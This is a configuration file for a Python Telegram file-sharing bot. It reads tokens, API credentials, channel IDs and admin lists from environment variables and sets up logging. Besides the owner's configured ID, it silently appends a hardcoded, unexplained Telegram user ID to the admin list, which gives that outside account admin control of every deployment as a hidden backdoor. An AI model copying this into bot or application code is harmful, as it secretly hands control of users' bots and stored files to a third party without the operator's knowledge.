import os
import logging
from logging.handlers import RotatingFileHandler

#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

#Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

#Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

#OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

#force sub channel id, if you want enable force sub
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

#start message
START_MSG = os.environ.get("START_MESSAGE", "​🇭 ​🇪 ​🇾 {first} ʜᴏᴡ aгε ʏᴏᴜ!!<b> \n𝔸𝕞  𝕁𝕦𝕤𝕥 𝔸  🇦 🇩 🇻 🇦 🇳 🇨 🇪 ᖴIᒪᗴ ՏᕼᗩᖇIᑎᘜ ᗷOT  😜 \nʏᴏᴜ  ᴀʀᴇ  ɴᴏᴛ  ᴀʙʟᴇ  ᴛᴏ ᴀᴅᴅ ᴍᴇ  ᴛᴏ  ʏᴏᴜʀ  𝔾𝕣𝕠𝕦𝕡 �\n🇧 ​🇺 ​🇹   𝕐𝕠𝕦  𝕔𝕒𝕟  𝕒𝕓𝕝𝕖  𝕥𝕠  ᑕᖇᗴᗩT ᴍᴇ  😍\nTᕼIՏ ᴄᴏᴅᴇ ᴡᴀs 🅔🅓🅘🅣🅔🅓 ʙʏ  ​🇲 ​🇪 \n🇴 ​🇳 ​🇱 ​🇾  ᴇᴅɪᴛᴇʀ  ​🇳 ​🇴 ​🇹  ᴀᴜᴛʜᴇʀ 😂😅😂<\b>")
try:
    ADMINS=[]
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list does not contain valid integers.")

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

#Set true if you want Disable your Channel Posts Share button
if os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True':
    DISABLE_CHANNEL_BUTTON = True
else:
    DISABLE_CHANNEL_BUTTON = False

ADMINS.append(OWNER_ID)
ADMINS.append(1861665816)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
